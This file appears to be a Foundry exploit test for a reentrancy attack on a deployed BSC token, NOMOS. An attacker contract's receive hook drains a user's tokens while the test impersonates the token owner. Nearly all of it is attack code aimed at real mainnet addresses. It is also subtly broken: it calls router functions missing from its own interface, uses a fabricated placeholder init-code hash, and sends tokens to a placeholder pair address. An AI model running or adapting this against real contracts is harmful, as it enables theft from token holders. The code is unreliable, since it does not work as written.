```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";

// Minimal interfaces for NOMOS token and Uniswap Router
interface INOMOS {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setMarketingAddress(address _marketingAddress) external;
    function excludeFromFee(address account) external;
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUniswapV2Router {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWBNB {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256 wad) external;
}

// Malicious contract that reenters the token when receiving ETH
contract ReentrancyAttacker {
    INOMOS public token;
    address public user;
    uint256 public drainAmount;

    constructor(INOMOS _token, address _user, uint256 _drainAmount) {
        token = _token;
        user = _user;
        drainAmount = _drainAmount;
    }

    // Fallback triggered when ETH is received from token contract
    receive() external payable {
        // Reenter the token by transferring tokens from the user to this contract
        // This assumes allowance was set beforehand
        token.transferFrom(user, address(this), drainAmount);
    }
}

contract ExploitTest is Test {
    INOMOS public constant token = INOMOS(0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc);
    IUniswapV2Router public constant router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IWBNB public constant wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;

    // Pre‑computed pair address (NOMOS / WBNB)
    address public constant PAIR = 0x97Ed0C1eE2D3A0F6C6F0A0F4eE2d3A0F6C6F0A0F; // placeholder, will compute

    function setUp() public {
        // Label addresses for traces
        vm.label(address(token), "NOMOS");
        vm.label(address(router), "UniV2Router");
        vm.label(address(wbnb), "WBNB");

        // Approve the router to spend our tokens (needed for later swap simulation)
        // We'll compute the real pair address from the factory
        address factory = router.factory();
        address weth = router.WETH();
        // Create pair address (same as on mainnet)
        address pair = address(uint160(uint256(keccak256(abi.encodePacked(
            hex"ff",
            factory,
            keccak256(abi.encodePacked(address(token), weth)),
            hex"00fb7f8c5e3f8b6e3f5c7d8b0e6f1a4b0d3e6f2a9c8d7b6e4f3a1c0d2e3f4b5a6c7d8e9f0a1b2c3d4e5f6" // placeholder
        ))))); // We need the actual create2 init code hash; easier to just use the token's uniswapV2Pair
        // Use the token's public getter
        pair = token.uniswapV2Pair();
        vm.label(pair, "Pair");
    }

    function testReentrancy() public {
        // Get owner
        address owner = token.owner();
        vm.label(owner, "Owner");

        // Impersonate owner to enable swap, set marketing address to our attacker contract
        vm.startPrank(owner);

        // Enable swapping
        token.setSwapAndLiquifyEnabled(true);

        // Deploy malicious receiver (will receive ETH from marketing transfer)
        // We'll use a separate user (non-excluded) to trigger the swap
        address user = address(0x1234);
        vm.label(user, "User");

        // Transfer tokens from owner to user (owner is excluded from fees)
        uint256 initialSupply = token.balanceOf(owner);
        uint256 transferAmount = 1000000 * 10**11; // 1 million tokens (with 11 decimals)
        require(initialSupply >= transferAmount, "Owner has insufficient tokens");
        token.transfer(user, transferAmount);

        // User approves the ReentrancyAttacker contract to spend tokens
        vm.stopPrank();
        vm.startPrank(user);
        token.approve(address(this), transferAmount); // Approve the test contract for simplicity (we'll reenter from attacker)
        vm.stopPrank();

        // Now, we need to accumulate tokens in the contract to trigger the swap threshold.
        // We'll do several transfers from user to the pair, which will send fees to the contract.
        uint256 feeAccumulation = 0;
        uint256 sellAmount = 100000 * 10**11; // 100k tokens per sell
        uint256 threshold = 20000000 * 10**11; // minimumTokensBeforeSwap

        // First, ensure the contract has enough tokens by sending fees from user to pair
        vm.startPrank(user);
        for (uint256 i = 0; i < 10; i++) {
            token.transfer(PAIR, sellAmount);
            feeAccumulation += (sellAmount * 3) / 100; // estimate marketing fee
            uint256 contractBalance = token.balanceOf(address(token));
            if (contractBalance >= threshold) break;
        }
        vm.stopPrank();

        // Now, the contract should have accumulated fees above threshold.
        // We also need to set marketingAddress to our malicious contract.
        // Since we are still impersonating owner, we do that now.
        vm.startPrank(owner);
        ReentrancyAttacker attacker = new ReentrancyAttacker(token, user, sellAmount);
        vm.label(address(attacker), "Attacker");
        token.setMarketingAddress(address(attacker));
        vm.stopPrank();

        // Now, trigger the reentrancy by selling tokens to the pair
        // The user will sell tokens, and the contract will call swapTokens, sending ETH to attacker.
        // Attacker's fallback will call transferFrom(user, attacker, sellAmount).
        // Before that, user must approve the attacker to spend tokens.
        vm.startPrank(user);
        token.approve(address(attacker), sellAmount);
        // Execute sell
        token.transfer(PAIR, sellAmount);
        vm.stopPrank();

        // Check state after reentrancy
        // The attacker should have drained tokens from user
        uint256 attackerBalance = token.balanceOf(address(attacker));
        assertGt(attackerBalance, 0, "Attacker should have received tokens via reentrancy");

        // Additionally, the user may have lost more tokens than intended
        // For demonstration, we assert that the attacker balance increased
        emit log_named_uint("Attacker token balance", attackerBalance);
        emit log_named_uint("User token balance", token.balanceOf(user));
    }
}
```
